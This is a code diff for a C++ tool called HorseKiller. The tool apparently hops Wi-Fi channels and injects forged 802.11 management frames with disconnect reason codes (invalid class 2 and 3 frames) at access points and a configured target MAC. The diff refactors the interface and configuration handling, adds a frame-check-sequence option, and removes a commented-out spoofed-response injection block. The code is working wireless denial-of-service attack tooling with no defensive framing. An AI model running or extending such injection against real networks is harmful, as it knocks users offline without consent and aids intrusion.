@@ -33,11 +33,11 @@ enum ieee80211_radiotap_tx_flags
 	IEEE80211_RADIOTAP_F_TX_ORDER = 0x0020,
 };
 
-void injectPacket(PDU *pdu, pcap_t *handle)
+void injectPacket(PDU *pdu, bool drop_fcs, pcap_t *handle)
 {
 	auto pkt = pdu->serialize();
 
-	if (pcap_inject(handle, &pkt[0], pkt.size()) == -1)
+	if (pcap_inject(handle, &pkt[0], pkt.size() - (drop_fcs ? 4 : 0)) == -1)
 	{
 		std::cerr << "Error injecting packet... [ " << pcap_geterr(handle) << " ]" << std::endl;
 	}
@@ -72,7 +72,6 @@ class HorseKiller
 	int round = 0;
 	int now_channel_idx = 0;
 
-	std::string nif;
 	const Configuration &config;
 	AccessPointManager apm;
 
@@ -87,9 +86,8 @@ class HorseKiller
 	std::optional<Sniffer> psniffer;
 
 public:
-	HorseKiller(std::string interface,
-				const Configuration &config)
-		: sniffing(false), running(false), nif(interface), config(config), apm(config)
+	HorseKiller(const Configuration &config)
+		: sniffing(false), running(false), config(config), apm(config)
 	{
 	}
 
@@ -110,7 +108,7 @@ public:
 				std::cout << channel << std::endl;
 				std::cout.flush();
 
-				setChannel(nif.c_str(), channel, "");
+				setChannel(config.device.c_str(), channel, "");
 
 				auto prev_switch_time = std::chrono::high_resolution_clock::now();
 
@@ -153,7 +151,7 @@ public:
 								7 // INVALID_CLASS3_FRAME
 							);
 
-							injectPacket(&radio, psniffer->get_pcap_handle());
+							injectPacket(&radio, config.drop_fcs, psniffer->get_pcap_handle());
 						}
 
 						{
@@ -164,25 +162,8 @@ public:
 								6 // INVALID_CLASS2_FRAME
 							);
 
-							injectPacket(&radio, psniffer->get_pcap_handle());
+							injectPacket(&radio, config.drop_fcs, psniffer->get_pcap_handle());
 						}
-
-						// if (ap.resp)
-						// 	for (int i = 0; i < 4; i++)
-						// 	{
-						// 		auto &resp = *ap.resp;
-
-						// 		auto addr = resp.addr2();
-						// 		addr[5] = addr[5] * 61 + 2;
-						// 		resp.addr1(config.target_mac);
-						// 		resp.addr2(addr);
-						// 		resp.addr3(addr);
-
-						// 		RadioTap radio = RadioTap() / resp; // make 802.11 packet
-						// 		radio.tx_flags(IEEE80211_RADIOTAP_F_TX_NOACK);
-
-						// 		injectPacket(&radio, psniffer->get_pcap_handle());
-						// 	}
 
 						// std::this_thread::sleep_for(std::chrono::milliseconds(2));
 					}
@@ -234,7 +215,7 @@ public:
 		SnifferConfiguration conf;
 		conf.set_immediate_mode(true);
 		// conf.set_rfmon(true);
-		psniffer = Sniffer(nif, conf);
+		psniffer = Sniffer(config.device, conf);
 
 		packet_sender_loop = std::thread([this]() -> void {
 			inject_loop();
@@ -255,20 +236,19 @@ public:
 
 int main(int argc, char *argv[])
 {
-	if (argc != 3)
+	if (argc != 2)
 	{
-		cout << "Usage: " << argv[0] << " <interface> <configuration>" << endl;
+		cout << "Usage: " << argv[0] << " <configuration>" << endl;
 		return -1;
 	}
 
-	std::string nif = argv[1];
-	std::string yaml_filename = argv[2];
+	std::string yaml_filename = argv[1];
 
 	YAML::Node configYAML = YAML::LoadFile(yaml_filename);
 
 	Configuration config = configYAML.as<Configuration>();
 
-	HorseKiller killer(nif, config);
+	HorseKiller killer(config);
 
 	killer.start();
 
